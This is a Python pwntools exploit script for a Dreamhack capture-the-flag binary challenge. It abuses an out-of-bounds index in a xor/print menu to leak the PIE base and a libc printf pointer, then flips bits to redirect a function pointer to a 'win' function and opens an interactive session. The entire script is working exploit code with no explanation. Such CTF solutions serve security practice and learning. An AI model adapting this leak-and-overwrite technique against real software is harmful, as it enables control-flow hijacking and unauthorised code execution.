#!/usr/bin/env python3
from pwn import *

PORT = 12418
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./main', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

def xor(i, j):
	p.sendlineafter(b"> ", b'1')
	p.sendlineafter(b"Enter i & j > ", f"{i} {j}")

def _print(i):
	p.sendlineafter(b"> ", b'2')
	p.sendlineafter(b"Enter i > ", str(i).encode())

xor(64, -7)
_print(64)
p.recvuntil(b"Value: ")
pie_base = int(p.recvline()[:-1], 16)
pie_base -= 0x3488
log.info("pie_base: " + hex(pie_base))
win = pie_base + elf.sym.win
log.info("win: " + hex(win))

xor(65, -16)
_print(65)
p.recvuntil(b"Value: ")
printf = int(p.recvline()[:-1], 16)
log.info("printf: " + hex(printf))

delta = printf ^ win
log.info("delta: "+ hex(delta))

for bit in range(63):
    if (delta >> bit) & 1:
        xor(66, bit)

_print(66)
p.recvuntil(b"Value: ")
check = int(p.recvline()[:-1], 16)
log.info("check: " + hex(check))
# input()
xor(-16, 66)

p.interactive()